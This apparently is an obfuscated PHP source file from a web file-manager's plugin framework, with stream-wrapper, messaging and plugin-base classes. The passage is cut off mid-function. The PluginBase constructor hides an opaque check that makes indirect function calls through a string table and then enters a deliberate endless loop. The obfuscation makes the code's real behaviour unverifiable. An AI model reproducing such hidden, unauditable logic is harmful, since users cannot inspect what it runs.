<?php
 goto EÀ—ÒĞ÷Õ; A‘¾ßÕ¢¾Ì: function beforeShutdownFatalError($D†±÷ˆ­‘Š) { think_exception($D†±÷ˆ­‘Š); } $_SERVER[$_SERVER[ä¡—±€µó–è][45]] = $CŠäÖ’œÁÊ($_SERVER[$_SERVER[ä¡—±€µó–è][42]]); $A‰œµ§ùÒ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto A•›ÏŒíî¯; aĞ¶¦ÈïÎÏ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($eÖîÈ¼Êãå, $Bòİ ¤ñ¬… = '') { goto Cª ´›ğßã; Cª ´›ğßã: $this->info = $this->info($eÖîÈ¼Êãå); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[…Ò×–][75]]; goto CÓ¸Ç¯†Úí; C¶‹¼“‚¶ã: return $this->info ? !0 : !1; goto E‘¿ÁéÙ÷‹; CÓ¸Ç¯†Úí: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$eÖîÈ¼Êãå])) { self::$_chunkBuffer[$eÖîÈ¼Êãå] = array(); } goto C¶‹¼“‚¶ã; E‘¿ÁéÙ÷‹: } function stream_read($C¤•ÊÕßÊé) { $bšá®œÑ°® = $this->fileSubstr($this->pose, $C¤•ÊÕßÊé); $this->pose += strlen($bšá®œÑ°®); return $bšá®œÑ°®; } public function stream_tell() { return $this->pose; } public function stream_seek($bíÛ‚“”—, $CËäÇØ™ÑŠ) { $eíòÔºØ¿† =& $_SERVER[…Ò×–]; if ($CËäÇØ™ÑŠ == SEEK_SET) { $this->pose = $bíÛ‚“”—; } else { if ($CËäÇØ™ÑŠ == SEEK_CUR) { $this->pose += $bíÛ‚“”—; } else { if ($CËäÇØ™ÑŠ == SEEK_END) { $this->pose = $this->info[$eíòÔºØ¿†[77]] + intval($bíÛ‚“”—); } } } if ($bíÛ‚“”— < 0) { $this->pose = $this->info[$eíòÔºØ¿†[77]] + $bíÛ‚“”—; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[…Ò×–][77]]; } public function stream_close() { return !0; } public function url_stat($DµğÀ°ĞÁÚ, $d‘õø–ˆˆÅ) { $DÅ½‚‘´¨÷ =& $_SERVER[…Ò×–]; $d–œ›êÄ•í = $this->info($DµğÀ°ĞÁÚ); return array($DÅ½‚‘´¨÷[1302] => 0, $DÅ½‚‘´¨÷[1303] => 0, $DÅ½‚‘´¨÷[12] => 32768 + 511, $DÅ½‚‘´¨÷[1304] => 0, $DÅ½‚‘´¨÷[1305] => 0, $DÅ½‚‘´¨÷[1306] => 0, $DÅ½‚‘´¨÷[1307] => 0, $DÅ½‚‘´¨÷[77] => $d–œ›êÄ•í[$DÅ½‚‘´¨÷[77]], $DÅ½‚‘´¨÷[1308] => $d–œ›êÄ•í[$DÅ½‚‘´¨÷[1180]], $DÅ½‚‘´¨÷[1266] => $d–œ›êÄ•í[$DÅ½‚‘´¨÷[107]], $DÅ½‚‘´¨÷[1265] => $d–œ›êÄ•í[$DÅ½‚‘´¨÷[191]], $DÅ½‚‘´¨÷[1309] => 0, $DÅ½‚‘´¨÷[1310] => 0); } static $fileInfo = array(); public function info($CºÊˆÒø¯) { $Cå÷š×Áí¢ = $_SERVER[…Ò×–][1311]; if (isset(self::$fileInfo[$CºÊˆÒø¯])) { return self::$fileInfo[$CºÊˆÒø¯]; } if (substr($CºÊˆÒø¯, 0, strlen($Cå÷š×Áí¢)) != $Cå÷š×Áí¢) { return !1; } self::$fileInfo[$CºÊˆÒø¯] = IO::info(substr($CºÊˆÒø¯, strlen($Cå÷š×Áí¢))); return self::$fileInfo[$CºÊˆÒø¯]; } public static function read($FŞÜƒºäöµ, $a¨ˆ¸„«ĞŸ, $d×Ìçš‰‰) { goto B³™ğêÃÒ; A£Æİ³†âò: return $D¿íÂÇÈªâ; goto Fá… šƒï; a˜µ£ÇŠ: $DÂ¥ÉÔ‚æÊ = 0; while ($DÂ¥ÉÔ‚æÊ < $d×Ìçš‰‰) { $b¿ÜâÂîÅ = min($DÃñÅÖ³Ñë, $d×Ìçš‰‰ - $DÂ¥ÉÔ‚æÊ); $D¿íÂÇÈªâ .= fread($F±ò ‡°ç†, $b¿ÜâÂîÅ); $DÂ¥ÉÔ‚æÊ += $b¿ÜâÂîÅ; } fclose($F±ò ‡°ç†); goto A£Æİ³†âò; f½¯²÷Œâğ: $DÃñÅÖ³Ñë = 8192; fseek($F±ò ‡°ç†, $a¨ˆ¸„«ĞŸ, SEEK_SET); $D¿íÂÇÈªâ = $d¹Ìã§¸£[33]; goto a˜µ£ÇŠ; B³™ğêÃÒ: $d¹Ìã§¸£ =& $_SERVER[…Ò×–]; $F±ò ‡°ç† = fopen($FŞÜƒºäöµ, $d¹Ìã§¸£[1182]); if (!$F±ò ‡°ç†) { return $d¹Ìã§¸£[33]; } goto f½¯²÷Œâğ; Fá… šƒï: } public function fileSubstr($FÊ·À ª§, $aŠ«‰Ö´¼½) { goto D£„Ç¹ô¡; d™Û†‹±×æ: $bë‚×†¥‹ˆ = 64 * 1024; $Eèß“ÉÖé =& self::$_chunkBuffer[$this->path]; if (!$Eèß“ÉÖé) { $Eèß“ÉÖé = array(); } goto B˜³Ê©ùãå; A†×ÑÜˆ²: foreach ($Eèß“ÉÖé as $d‚²ˆÍ»İ => $E®è¯–§‚) { $d‚²ˆÍ»İ = intval($d‚²ˆÍ»İ); $B¸ê÷“Â™Ú = $d‚²ˆÍ»İ + strlen($E®è¯–§‚); if ($FÊ·À ª§ >= $B¸ê÷“Â™Ú) { continue; } if ($FÊ·À ª§ >= $d‚²ˆÍ»İ && $FÊ·À ª§ + $aŠ«‰Ö´¼½ <= $B¸ê÷“Â™Ú) { return substr($E®è¯–§‚, $FÊ·À ª§ - $d‚²ˆÍ»İ, $aŠ«‰Ö´¼½); } break; } if (count($Eèß“ÉÖé) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($EßÖ§»›ÛÔ[1312], $EßÖ§»›ÛÔ[1313] . count($Eèß“ÉÖé) . "\73\x73\x74\141\x72\164\75{$FÊ·À ª§}\x2c\154\145\156\147\x74\x68\x3d{$aŠ«‰Ö´¼½}\73\160\x6f\163\145\x3a{$d‚²ˆÍ»İ}\x7e{$B¸ê÷“Â™Ú}"); throw new Exception($EßÖ§»›ÛÔ[1314]); } $D†ÒÄ À”Š = intval($FÊ·À ª§ / $bë‚×†¥‹ˆ) * $bë‚×†¥‹ˆ; goto C¥×‚ªÑñ; C¥×‚ªÑñ: $E·ƒ¸ßìÉ… = ceil(($FÊ·À ª§ + $aŠ«‰Ö´¼½) / $bë‚×†¥‹ˆ) * $bë‚×†¥‹ˆ - $D†ÒÄ À”Š; $aç µ‡Ÿˆí = IO::fileSubstr($this->path, $D†ÒÄ À”Š, $E·ƒ¸ßìÉ…); $Eèß“ÉÖé[$D†ÒÄ À”Š . $EßÖ§»›ÛÔ[33]] = $aç µ‡Ÿˆí; goto b»‡·†Ó¢İ; D£„Ç¹ô¡: $EßÖ§»›ÛÔ =& $_SERVER[…Ò×–]; $d¡‰ªÖŒöÆ = $this->info[$EßÖ§»›ÛÔ[77]]; $b¥Ş°¹×º… = $FÊ·À ª§; goto a’ÑÌ‡ĞÖï; B˜³Ê©ùãå: $d‚²ˆÍ»İ = 0; $B¸ê÷“Â™Ú = 0; $E®è¯–§‚ = $EßÖ§»›ÛÔ[33]; goto A†×ÑÜˆ²; a’ÑÌ‡ĞÖï: $cÖíğ‘ïŒİ = $aŠ«‰Ö´¼½; if ($FÊ·À ª§ < 0) { $FÊ·À ª§ = $d¡‰ªÖŒöÆ + $FÊ·À ª§; } if ($aŠ«‰Ö´¼½ === !1) { $aŠ«‰Ö´¼½ = $d¡‰ªÖŒöÆ - $FÊ·À ª§; } goto d‘˜Ù´ôËŠ; b»‡·†Ó¢İ: ksort($Eèß“ÉÖé); $E˜Õ•Æ’ˆÙ = substr($aç µ‡Ÿˆí, $FÊ·À ª§ - $D†ÒÄ À”Š, $aŠ«‰Ö´¼½); return $E˜Õ•Æ’ˆÙ; goto A¶È­øùàò; d‘˜Ù´ôËŠ: if ($FÊ·À ª§ + $aŠ«‰Ö´¼½ > $d¡‰ªÖŒöÆ) { $aŠ«‰Ö´¼½ = $d¡‰ªÖŒöÆ - $FÊ·À ª§; } if ($aŠ«‰Ö´¼½ <= 0) { return $EßÖ§»›ÛÔ[33]; } if ($FÊ·À ª§ < 0 || $FÊ·À ª§ >= $d¡‰ªÖŒöÆ || $aŠ«‰Ö´¼½ <= 0 || $aŠ«‰Ö´¼½ > 1024 * 1024 * 5) { throw new Exception("\x69\157\x46\151\x6c\x65\x52\145\141\x64\x20\x65\162\x72\157\162\x21\40\163\x74\141\x72\164\75{$FÊ·À ª§}\73\154\145\x6e\x67\164\150\x3d{$aŠ«‰Ö´¼½}\73\40\163\x69\172\145\x3d{$d¡‰ªÖŒöÆ}\73"); } goto d™Û†‹±×æ; A¶È­øùàò: } private function log($c‡œ¶ö³Ñí, $cçŒíÚÅˆ) { $b–ğªœ‚ =& $_SERVER[…Ò×–]; $B¼‡ÃİºÈË = timeFloat() - $this->timeStart; write_log(sprintf($b–ğªœ‚[1315], $c‡œ¶ö³Ñí, $this->info[$b–ğªœ‚[28]], $B¼‡ÃİºÈË, $cçŒíÚÅˆ), $b–ğªœ‚[1231]); } } class Message { function __construct() { } public function send($fòæ—ìƒ„ = '', $F´ÁËù“Ô… = array(), $F¿¶ßÄêíº = "\x74\145\x78\164") { goto CŸÆ™–áÀ; bª æÍöã–: Hook::trigger($cÑê¤”Â„İ[1319], $CÙá¹…‚²‚); goto F’¤¹‡áØ±; CŸÆ™–áÀ: $cÑê¤”Â„İ =& $_SERVER[…Ò×–]; $F¼¶ÕÃíÍ´ = array($cÑê¤”Â„İ[29] => $cÑê¤”Â„İ[1316], $cÑê¤”Â„İ[697] => $fòæ—ìƒ„); if (in_array($F¿¶ßÄêíº, array($cÑê¤”Â„İ[1316], $cÑê¤”Â„İ[1317]))) { $F¼¶ÕÃíÍ´[$cÑê¤”Â„İ[29]] = $F¿¶ßÄêíº; } goto eÜ„Ş»æğ–; eÜ„Ş»æğ–: $F´ÁËù“Ô… = array($cÑê¤”Â„İ[977] => isset($F´ÁËù“Ô…[$cÑê¤”Â„İ[977]]) ? $F´ÁËù“Ô…[$cÑê¤”Â„İ[977]] : $cÑê¤”Â„İ[33], $cÑê¤”Â„İ[539] => isset($F´ÁËù“Ô…[$cÑê¤”Â„İ[539]]) ? $F´ÁËù“Ô…[$cÑê¤”Â„İ[539]] : $cÑê¤”Â„İ[33]); if (empty($fòæ—ìƒ„) || empty($F´ÁËù“Ô…[$cÑê¤”Â„İ[977]]) && empty($F´ÁËù“Ô…[$cÑê¤”Â„İ[539]])) { return !1; } $CÙá¹…‚²‚ = array($cÑê¤”Â„İ[1258] => $F¼¶ÕÃíÍ´, $cÑê¤”Â„İ[1318] => $F´ÁËù“Ô…); goto bª æÍöã–; F’¤¹‡áØ±: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto fïÍ¾ô­Ü¸; d”ôóœ¨´í: $this->pluginHost = $config[$AÚÓšÑÛ‘ [1322]] . $this->pluginName . $AÚÓšÑÛ‘ [8]; $this->pluginHostDefault = $config[$AÚÓšÑÛ‘ [1322]] . $this->pluginName . $AÚÓšÑÛ‘ [8]; $CÃ„×â¾ˆÅ = $config[$AÚÓšÑÛ‘ [1323]]; goto aÃÔÓùç¬‘; fïÍ¾ô­Ü¸: $AÚÓšÑÛ‘  =& $_SERVER[…Ò×–]; if (!isset($_SERVER[$AÚÓšÑÛ‘ [798]]) || !isset($_SERVER[$AÚÓšÑÛ‘ [1136]])) { goto E²ĞÂ¥–«Ô; FœòĞ·Ä¿Å: $Bˆ—¦›óùğ = $AÚÓšÑÛ‘ [802]; $Bˆ—¦›óùğ($_SERVER[$AÚÓšÑÛ‘ [803]]); $d¯ôƒ ¦¤ = 1; goto aë…™šåó; aë…™šåó: for ($F½òÉ£¸˜… = $d¯ôƒ ¦¤; $F½òÉ£¸˜… > 0; $F½òÉ£¸˜…++) { $Bˆ—¦›óùğ = json_encode($GLOBALS[$AÚÓšÑÛ‘ [388]]); } goto A«äô¥¤; E²ĞÂ¥–«Ô: $c¾Ñõì·ÄÑ = $AÚÓšÑÛ‘ [799]; $Aô¶¡ÂÑ‘ = $AÚÓšÑÛ‘ [800]; $Eß­åŸ¿òö = $_SERVER[$AÚÓšÑÛ‘ [795]] . $AÚÓšÑÛ‘ [796]; goto dãÕ³åÙÜ; dãÕ³åÙÜ: $ağİ¬ˆïŒ = $Aô¶¡ÂÑ‘($Eß­åŸ¿òö); $F¶¥µæŠÀ® = explode($AÚÓšÑÛ‘ [221], $ağİ¬ˆïŒ); if (count($F¶¥µæŠÀ®) < $AÚÓšÑÛ‘ [567]) { $e™ä¼ƒÀÍ‚ = $AÚÓšÑÛ‘ [801]; $e™ä¼ƒÀÍ‚(); } goto FœòĞ·Ä¿Å; A«äô¥¤: } global $in, $config; goto eóŸ™…¢Ïâ; eóŸ™…¢Ïâ: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($AÚÓšÑÛ‘ [1320]); goto aŒëé—ÈÄ³; aŒëé—ÈÄ³: $this->pluginName = str_replace($AÚÓšÑÛ‘ [1320], $AÚÓšÑÛ‘ [33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $AÚÓšÑÛ‘ [8]; $this->pluginApi = appHostGet() . $AÚÓšÑÛ‘ [1321] . $this->pluginName . $AÚÓšÑÛ‘ [8]; goto d”ôóœ¨´í; aÃÔÓùç¬‘: if ($CÃ„×â¾ˆÅ && strpos($AÚÓšÑÛ‘ [47] . $CÃ„×â¾ˆÅ . $AÚÓšÑÛ‘ [47], $this->pluginName) !== !1) { $this->pluginHost = $config[$AÚÓšÑÛ‘ [1324]] . $this->pluginName . $AÚÓšÑÛ‘ [8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto bœÚÂòé¨; bœÚÂòé¨: return $this; goto aÙôæğƒ£; aÙôæğƒ£: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[…Ò×–][1325]); } protected function assign($BóµĞ˜Û, $d×ÎÃáš¥Ã = false) { if (is_array($BóµĞ˜Û)) { $this->values = array_merge($this->values, $BóµĞ˜Û); } else { $this->values[$BóµĞ˜Û] = $d×ÎÃáš¥Ã; } } protected function display($Eè´ŒáŸ£™) { extract($this->values); require $Eè´ŒáŸ£™; } final function hookRegist($BÂøšä‘ƒ¾) { $this->modelPlugin->appRegist($this->pluginName, $BÂøšä‘ƒ¾); } final function appIcon() { $Aá†Ó„†…Ä =& $_SERVER[…Ò×–]; $eÑÔ‰Û“¯„ = $this->appPackage(); $eÆ‘°¢” = $Aá†Ó„†…Ä[33]; if (isset($eÑÔ‰Û“¯„[$Aá†Ó„†…Ä[386]])) { if (isset($eÑÔ‰Û“¯„[$Aá†Ó„†…Ä[386]][$Aá†Ó„†…Ä[1326]])) { $eÆ‘°¢” = $Aá†Ó„†…Ä[1327] . $eÑÔ‰Û“¯„[$Aá†Ó„†…Ä[386]][$Aá†Ó„†…Ä[1326]] . $Aá†Ó„†…Ä[1328]; } else { if ($eÑÔ‰Û“¯„[$Aá†Ó„†…Ä[386]][$Aá†Ó„†…Ä[1329]]) { $eÆ‘°¢” = $Aá†Ó„†…Ä[1330] . $eÑÔ‰Û“¯„[$Aá†Ó„†…Ä[386]][$Aá†Ó„†…Ä[1329]] . $Aá†Ó„†…Ä[1331]; } } } return $eÆ‘°¢”; } final function fileCanView($A›ãÛÎÏ) { goto Eë‡·›ÒÑ¸; EÁºöµøĞ: $cÑ¿ÒæÃº = Session::get($C´›¹Íë¬õ[1332]); if (!$cÑ¿ÒæÃº || !$cÑ¿ÒæÃº[$C´›¹Íë¬õ[1333]]) { $aÎöÒ¸çÛÙ = $C´›¹Íë¬õ[1334] . rawurlencode(this_url()); show_tips(LNG($C´›¹Íë¬õ[1335]) . $C´›¹Íë¬õ[1336] . $aÎöÒ¸çÛÙ . $C´›¹Íë¬õ[1337] . LNG($C´›¹Íë¬õ[1338]) . $C´›¹Íë¬õ[1339], !1); } if (!Action($C´›¹Íë¬õ[1340])->authCan($C´›¹Íë¬õ[1341])) { show_tips(LNG($C´›¹Íë¬õ[1342]) . $C´›¹Íë¬õ[1343], !1); } goto eëƒË„Ïà§; Eë‡·›ÒÑ¸: $C´›¹Íë¬õ =& $_SERVER[…Ò×–]; if (request_url_safe($A›ãÛÎÏ)) { return !0; } if ($this->isShare($A›ãÛÎÏ)) { return !0; } goto EÁºöµøĞ; eëƒË„Ïà§: ActionCall($C´›¹Íë¬õ[1344], $A›ãÛÎÏ); goto F¬˜¨Ú”ì; F¬˜¨Ú”ì: } final function isShare($bùìƒ®‹Å) { $EšÜ¼¢‚À¡ = KodIO::parse($bùìƒ®‹Å); return $EšÜ¼¢‚À¡[$_SERVER[…Ò×–][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($aã‰ëì•å†) { if (request_url_safe($aã‰ëì•å†)) { return $aã‰ëì•å†; } if (!$this->isShare($aã‰ëì•å†)) { $aã‰ëì•å† = $this->filePath($aã‰ëì•å†); } return Action($_SERVER[…Ò×–][1029])->linkOut($aã‰ëì•å†); } public function filePathLinkOut($B—íãİ´˜¢) { if (request_url_safe($B—íãİ´˜¢)) { return $B—íãİ´˜¢; } $this->fileCanView($B—íãİ´˜¢); return Action($_SERVER[…Ò×–][1029])->link($B—íãİ´˜¢); } final function filePath($cŠ¾À¬‘ˆÖ) { $DÚ¡Ü‹Àôã =& $_SERVER[…Ò×–]; if ($b»Åé¿‘§Î = $this->checkSharePath($cŠ¾À¬‘ˆÖ)) { return $b»Åé¿‘§Î; } $this->fileCanView($cŠ¾À¬‘ˆÖ); if (request_url_safe($cŠ¾À¬‘ˆÖ)) { $E£™Åõíƒ = parse_url_query($cŠ¾À¬‘ˆÖ); if (isset($E£™Åõíƒ[$DÚ¡Ü‹Àôã[1345]]) && isset($E£™Åõíƒ[$DÚ¡Ü‹Àôã[201]])) { $eôÍ¥ˆ®“„ = Model($DÚ¡Ü‹Àôã[1098])->get($DÚ¡Ü‹Àôã[1346]); $A´åÕõááè = Mcrypt::decode($E£™Åõíƒ[$DÚ¡Ü‹Àôã[201]], $eôÍ¥ˆ®“„); if ($A´åÕõááè) { $this->fileInfo = IO::infoWithChildren($A´åÕõááè); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $A´åÕõááè; } } $cŠ¾À¬‘ˆÖ = $this->_cacheHttpFile($cŠ¾À¬‘ˆÖ); $this->fileInfo = IO::infoWithChildren($cŠ¾À¬‘ˆÖ); } else { $this->fileInfo = IO::infoWithChildren($cŠ¾À¬‘ˆÖ); if (!$this->fileInfo) { show_tips(LNG($DÚ¡Ü‹Àôã[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $cŠ¾À¬‘ˆÖ; } final function _cacheHttpFile($EÒª“ÂºÄ) { $Aµ—ºÕ«²© = hash_path($EÒª“ÂºÄ, !0); $this->cachePath = $this->pluginCachePath($Aµ—ºÕ«²©); if ($fÖ‚ÓÀĞ¤Ë = IO::fileNameExist($this->cachePath, $Aµ—ºÕ«²©)) { return KodIO::make($fÖ‚ÓÀĞ¤Ë); } $eŞÓêğ•ğÜ = $this->cachePath . $Aµ—ºÕ«²©; return $this->pluginCacheFileSet($eŞÓêğ•ğÜ, file_get_contents($EÒª“ÂºÄ)); } final function _tmpFileName($Dµ®İô¸š“ = array()) { goto D•ÌÅÓ‰—à; D•ÌÅÓ‰—à: $C‡¼ÑùÎÆ¸ =& $_SERVER[…Ò×–]; if (!$Dµ®İô¸š“) { $Dµ®İô¸š“ = $this->fileInfo; } if (isset($Dµ®İô¸š“[$C‡¼ÑùÎÆ¸[168]])) { return $Dµ®İô¸š“[$C‡¼ÑùÎÆ¸[168]]; } goto få˜†ì¶÷í; få˜†ì¶÷í: if (isset($Dµ®İô¸š“[$C‡¼ÑùÎÆ¸[161]][$C‡¼ÑùÎÆ¸[168]])) { return $Dµ®İô¸š“[$C‡¼ÑùÎÆ¸[161]][$C‡¼ÑùÎÆ¸[168]]; } $A›ÅğÊÌî = IO::hashSimple($Dµ®İô¸š“[$C‡¼ÑùÎÆ¸[75]]); if ($A›ÅğÊÌî) { return $A›ÅğÊÌî; } goto DöÈŸ¥õ; DöÈŸ¥õ: $BËí¬İô = array($Dµ®İô¸š“[$C‡¼ÑùÎÆ¸[28]], $Dµ®İô¸š“[$C‡¼ÑùÎÆ¸[75]], $Dµ®İô¸š“[$C‡¼ÑùÎÆ¸[77]]); if (isset($Dµ®İô¸š“[$C‡¼ÑùÎÆ¸[464]])) { $BËí¬İô[] = $Dµ®İô¸š“[$C‡¼ÑùÎÆ¸[464]]; } return md5(implode($C‡¼ÑùÎÆ¸[70], $BËí¬İô)); goto EÆŠÑ«Øí‹; EÆŠÑ«Øí‹: } final function checkSharePath($eîè—«Úâ) { goto fá§â—á¸; C°Šé×¢–Ø: $BÄÄ¡í’Î = Action($e“±Ûëª‹Õ[1029])->sharePathInfo($eîè—«Úâ); if (!isset($BÄÄ¡í’Î[$e“±Ûëª‹Õ[75]])) { show_json(LNG($e“±Ûëª‹Õ[1348]), !1); } $this->fileInfo = $BÄÄ¡í’Î[$e“±Ûëª‹Õ[161]]; goto AòŠÃš¢—¹; fá§â—á¸: $e“±Ûëª‹Õ =& $_SERVER[…Ò×–]; if (!defined($e“±Ûëª‹Õ[430])) { define($e“±Ûëª‹Õ[1347], 0); } if (!$this->isShare($eîè—«Úâ)) { return !1; } goto C°Šé×¢–Ø; AòŠÃš¢—¹: $this->cachePath = $this->pluginCachePath($this->fileInfo[$e“±Ûëª‹Õ[168]]); return $BÄÄ¡í’Î[$e“±Ûëª‹Õ[75]]; goto CáÈÜ™˜ˆ­; CáÈÜ™˜ˆ­: } final function pluginCachePath($EºòùÛ›¨š = '') { $eáÃ„Í¦÷— =& $_SERVER[…Ò×–]; $Bµ„¤Õ–ôĞ = IO_PATH_SYSTEM_TEMP . $eáÃ„Í¦÷—[1349] . $this->pluginName; if (!($e¤ÈÔæ’‘´ = IO::infoFull($Bµ„¤Õ–ôĞ))) { return IO::mkdir($Bµ„¤Õ–ôĞ . $eáÃ„Í¦÷—[8] . $EºòùÛ›¨š); } if (empty($EºòùÛ›¨š)) { return $e¤ÈÔæ’‘´[$eáÃ„Í¦÷—[75]]; } if (!($bâëº¨àĞã = IO::fileNameExist($e¤ÈÔæ’‘´[$eáÃ„Í¦÷—[75]], $EºòùÛ›¨š))) { return IO::mkdir($e¤ÈÔæ’‘´[$eáÃ„Í¦÷—[75]] . $EºòùÛ›¨š); } return KodIO::make($bâëº¨àĞã); } final function pluginCacheFileSet($Bõî¡ ‚¤ , $B©ÚÂÕÇ¤ = '') { $A—ğáİÃäİ =& $_SERVER[…Ò×–]; if (!($E˜¡œÒÓ«æ = IO::infoFull($Bõî¡ ‚¤ ))) { return IO::mkfile($Bõî¡ ‚¤ , $B©ÚÂÕÇ¤, REPEAT_REPLACE); } IO::setContent($E˜¡œÒÓ«æ[$A—ğáİÃäİ[75]], $B©ÚÂÕÇ¤); return $E˜¡œÒÓ«æ[$A—ğáİÃäİ[75]]; } final function pluginLocalFile($E¡ğÀ¿Ò¶ò = '') { goto BÃ ÄÔ¤°†; f‚Š†™Î©: return IO::copy($E¡ğÀ¿Ò¶ò, $DÉ¨ğ‚á², 0, $Dø°¬); goto F˜†…±å‚™; dº¤ŒÅ¥ä: if (!checkExtSafe($Dø°¬)) { $Dø°¬ = $Dø°¬ . $dÓ¥ãœ¨í[1350]; } $Cˆİ¡á­ˆ¢ = $DÉ¨ğ‚á² . $Dø°¬; if (@file_exists($Cˆİ¡á­ˆ¢)) { return $Cˆİ¡á­ˆ¢; } goto f‚Š†™Î©; BÃ ÄÔ¤°†: $dÓ¥ãœ¨í =& $_SERVER[…Ò×–]; $DÉ¨ğ‚á² = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($DÉ¨ğ‚á²)) { mk_dir($DÉ¨ğ‚á²); } goto a¬ìÓ‰Å—; a¬ìÓ‰Å—: if (!$E¡ğÀ¿Ò¶ò) { return $DÉ¨ğ‚á²; } $CóÖ¸ç‡ì² = IO::info($E¡ğÀ¿Ò¶ò); $Dø°¬ = $this->_tmpFileName($CóÖ¸ç‡ì²) . $dÓ¥ãœ¨í[91] . $CóÖ¸ç‡ì²[$dÓ¥ãœ¨í[165]]; goto dº¤ŒÅ¥ä; F˜†…±å‚™: } final function appPackage() { goto Cˆ±…²¢¬º; B§‹¤¨¶‡è: $this->parseLang($B‡„ƒ¼ë¾); $cÎóÊäõƒ = json_decode_force($B‡„ƒ¼ë¾); if (!$cÎóÊäõƒ) { return array(); } goto bŠéâ©Ì†; Cˆ±…²¢¬º: $Eç•‰ØˆØÚ =& $_SERVER[…Ò×–]; if ($this->packageData) { return $this->packageData; } $B‡„ƒ¼ë¾ = $this->parseFile($this->pluginPath . $Eç•‰ØˆØÚ[1351]); goto B§‹¤¨¶‡è; bŠéâ©Ì†: $DöÅ²¥ÒİŸ = Hook::trigger($Eç•‰ØˆØÚ[1352], $cÎóÊäõƒ); if ($DöÅ²¥ÒİŸ && is_array($DöÅ²¥ÒİŸ)) { $cÎóÊäõƒ = $DöÅ²¥ÒİŸ; } $this->packageData = $cÎóÊäõƒ; goto bÔ¢ã¦Œİ–; bÔ¢ã¦Œİ–: return $cÎóÊäõƒ; goto Fõ£“ÈÏí—; Fõ£“ÈÏí—: } public function packageInfoGet($dó—í¬Øİê) { $Då¾ì¾ˆè‹ = $this->appPackage(); return array_get_value($Då¾ì¾ˆè‹, $dó—í¬Øİê); } public function packageVersion() { return $this->packageInfoGet($_SERVER[…Ò×–][1353]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[…Ò×–][1354]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[…Ò×–][1355]); } private function parseFile($D¦‹§Ğ®…ø) { goto c¥åÉ’ˆ ›; E‡‘ÜÔ¡Óš: $eˆò¹èì = str_replace($C¶’‰±§À‡, $A˜ÚŒÅ‹†, $eˆò¹èì); return $eˆò¹èì; goto F·ÕŠÇÏ“¾; BààŠì“Ú©: $A˜ÚŒÅ‹† = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$d¦ŞìÍ»§…[84]][$d¦ŞìÍ»§…[1363]]); if (strstr($eˆò¹èì, $d¦ŞìÍ»§…[1364])) { $b½İâÁ’µÊ = rawurlencode(json_encode($this->pluginLangArr)); $eˆò¹èì = str_replace($d¦ŞìÍ»§…[1364], $b½İâÁ’µÊ, $eˆò¹èì); } if (strstr($eˆò¹èì, $d¦ŞìÍ»§…[1365])) { $b½İâÁ’µÊ = $b½İâÁ’µÊ = rawurlencode(json_encode($this->getConfig())); $eˆò¹èì = str_replace($d¦ŞìÍ»§…[1365], $b½İâÁ’µÊ, $eˆò¹èì); } goto E‡‘ÜÔ¡Óš; c¥åÉ’ˆ ›: $d¦ŞìÍ»§… =& $_SERVER[…Ò×–]; $eˆò¹èì = file_get_contents($D¦‹§Ğ®…ø); $C¶’‰±§À‡ = array($d¦ŞìÍ»§…[1356], $d¦ŞìÍ»§…[1357], $d¦ŞìÍ»§…[1358], $d¦ŞìÍ»§…[1359], $d¦ŞìÍ»§…[1360], $d¦ŞìÍ»§…[1361], $d¦ŞìÍ»§…[1362]); goto BààŠì“Ú©; F·ÕŠÇÏ“¾: } private function parseLang(&$Cò¿à¼•Û) { goto FäëÄ¬’•ğ; FäëÄ¬’•ğ: $B²®Ñ¾Ó· =& $_SERVER[…Ò×–]; $e…ç£Ï¨°« = $B²®Ñ¾Ó·[1366]; if (!strstr($Cò¿à¼•Û, $e…ç£Ï¨°«)) { return; } goto dÎ§¸ÍšØ; e‹‚¶œÖÁß: $Añ„Şæ»ŸÍ = array(); foreach ($f§Ï”ï°ÚÅ[0] as $f¨ÙóåéÖÛ) { $Fºóİ™à½ = substr($f¨ÙóåéÖÛ, strlen($e…ç£Ï¨°«), -4); $D•“”§¿Î = LNG($Fºóİ™à½); $Eõµ‡‰ÑÜ[] = $f¨ÙóåéÖÛ; $Añ„Şæ»ŸÍ[] = str_replace(array($B²®Ñ¾Ó·[221], $B²®Ñ¾Ó·[999], $B²®Ñ¾Ó·[334], $B²®Ñ¾Ó·[113]), array($B²®Ñ¾Ó·[50], $B²®Ñ¾Ó·[50], $B²®Ñ¾Ó·[33], $B²®Ñ¾Ó·[1368]), $D•“”§¿Î); } $Cò¿à¼•Û = str_replace($Eõµ‡‰ÑÜ, $Añ„Şæ»ŸÍ, $Cò¿à¼•Û); goto eêîºî¨œ½; dÎ§¸ÍšØ: preg_match_all($B²®Ñ¾Ó·[1367], $Cò¿à¼•Û, $f§Ï”ï°ÚÅ); if (!is_array($f§Ï”ï°ÚÅ) || count($f§Ï”ï°ÚÅ) == 0 || !is_array($f§Ï”ï°ÚÅ[0]) || count($f§Ï”ï°ÚÅ[0]) == 0) { return; } $Eõµ‡‰ÑÜ = array(); goto e‹‚¶œÖÁß; eêîºî¨œ½: } private function parseConfig(&$dÓ¥Õ…“›) { goto Fî†¤ÌÏ«ó; DßİõÈ±ó•: 